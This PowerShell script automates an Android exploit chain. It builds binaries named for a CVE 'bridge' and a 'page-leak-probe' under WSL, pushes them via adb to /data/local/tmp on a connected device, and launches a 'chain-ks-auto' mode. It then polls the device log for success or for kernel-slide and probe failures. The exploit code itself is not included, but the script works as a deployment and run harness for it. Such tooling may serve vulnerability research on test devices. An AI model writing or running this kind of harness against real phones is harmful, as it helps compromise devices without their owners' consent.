# One-shot: build the clean bridge, push it, launch chain-ks-auto, poll.
# Prints the built/pushed sizes so the launched binary is provably fresh.
# Logs are timestamped per run (no stale-log ambiguity).

param(
    [string]$Mode = "chain-ks-auto",
    [string]$Serial,
    [string]$NdkPath = $env:ANDROID_NDK_HOME
)

$ErrorActionPreference = "Stop"
$adb = (Get-Command adb -ErrorAction Stop).Source
$device = if ($Serial) { @("-s", $Serial) } else { @() }
$root = (Resolve-Path (Join-Path $PSScriptRoot "..")).Path
$wslRoot = (& wsl -e wslpath -a $root 2>&1 | Out-String).Trim()
if ($LASTEXITCODE -ne 0 -or -not $wslRoot) { throw "could not map repo path into WSL" }
if ($wslRoot.Contains("'")) { throw "repo path cannot contain a single quote" }
if (-not $NdkPath) { throw "set ANDROID_NDK_HOME or pass -NdkPath" }
$wslNdkPath = if ($NdkPath -match "^[A-Za-z]:[\\/]") {
    (& wsl -e wslpath -a $NdkPath 2>&1 | Out-String).Trim()
} else {
    $NdkPath
}
if ($LASTEXITCODE -ne 0 -or -not $wslNdkPath) { throw "could not map NDK path into WSL" }
if ($wslNdkPath.Contains("'")) { throw "NDK path cannot contain a single quote" }
$buildScriptPath = Join-Path ([IO.Path]::GetTempPath()) "rmg-build-bridge.sh"
$wslBuildScriptPath = (& wsl -e wslpath -a $buildScriptPath 2>&1 | Out-String).Trim()
if ($LASTEXITCODE -ne 0 -or -not $wslBuildScriptPath) { throw "could not map build script path into WSL" }

# 1. build
$buildScript = @"
#!/bin/bash
set -euo pipefail
cd '$wslRoot/exploit'
export ANDROID_NDK_HOME='$wslNdkPath'
make out/cve-2026-43499-bridge out/page-leak-probe
stat -c "bridge:%s" out/cve-2026-43499-bridge
stat -c "probe:%s" out/page-leak-probe
"@
[IO.File]::WriteAllText($buildScriptPath, ($buildScript -replace "`r`n", "`n"), [Text.Encoding]::ASCII)
try {
    $wslOut = (& wsl -e bash $wslBuildScriptPath 2>&1 | Out-String).Trim()
    $buildExitCode = $LASTEXITCODE
} finally {
    Remove-Item -LiteralPath $buildScriptPath -Force
}
if ($buildExitCode -ne 0) { throw "build failed: $wslOut" }
$bridgeMatch = [regex]::Match($wslOut, "bridge:(\d+)")
$probeMatch = [regex]::Match($wslOut, "probe:(\d+)")
if (-not $bridgeMatch.Success -or -not $probeMatch.Success) {
    throw "build size missing: $wslOut"
}
$builtBridgeSize = $bridgeMatch.Groups[1].Value
$builtProbeSize = $probeMatch.Groups[1].Value
Write-Output "built bridge bytes: $builtBridgeSize"
Write-Output "built probe bytes: $builtProbeSize"

# 2. push
& $adb @device push "$root\exploit\out\cve-2026-43499-bridge" /data/local/tmp/rb3 | Out-Null
& $adb @device shell "chmod 755 /data/local/tmp/rb3"
& $adb @device push "$root\exploit\out\page-leak-probe" /data/local/tmp/page-leak-probe | Out-Null
& $adb @device shell "chmod 755 /data/local/tmp/page-leak-probe"
$devBridgeSize = (& $adb @device shell "stat -c %s /data/local/tmp/rb3" 2>&1).Trim()
$devProbeSize = (& $adb @device shell "stat -c %s /data/local/tmp/page-leak-probe" 2>&1).Trim()
Write-Output "device bridge bytes: $devBridgeSize"
Write-Output "device probe bytes: $devProbeSize"
if ($devBridgeSize -ne $builtBridgeSize -or $devProbeSize -ne $builtProbeSize) {
    throw "binary mismatch: bridge=$builtBridgeSize/$devBridgeSize probe=$builtProbeSize/$devProbeSize"
}

# 3. boot wait (boot_completed only)
$deadline = (Get-Date).AddMinutes(3)
do {
    Start-Sleep -Seconds 4
    $boot = (& $adb @device shell "getprop sys.boot_completed" 2>&1).Trim()
    if ($boot -eq "1") { break }
} while ((Get-Date) -lt $deadline)
if ($boot -ne "1") { throw "boot did not complete" }
Start-Sleep -Seconds 20

# 4. launch
& $adb @device push "$PSScriptRoot\launch-one.sh" /data/local/tmp/launch-one.sh | Out-Null
$launchOut = (& $adb @device shell "sh /data/local/tmp/launch-one.sh $Mode" 2>&1 | Out-String).Trim()
Write-Output $launchOut
$logPath = "/data/local/tmp/chain-latest.log"
if ($launchOut -match "LOG=(\S+)") { $logPath = $Matches[1] }
Write-Output "log: $logPath"

# 5. poll
$deadline = (Get-Date).AddSeconds(120)
$text = ""
while ((Get-Date) -lt $deadline) {
    Start-Sleep -Seconds 8
    $text = (& $adb @device shell "cat $logPath 2>/dev/null" 2>&1 | Out-String).Trim()
    if ($text -match "chain ready") { Write-Output "=== DONE: $Mode"; break }
    if ($text -match "CHAIN_FAIL|FAIL .* errno|slide auto failed|ks probe failed") { Write-Output "=== FAILED: $Mode"; break }
}
Write-Output "--- last log lines ($logPath) ---"
($text -split "`n" | Select-Object -Last 14)
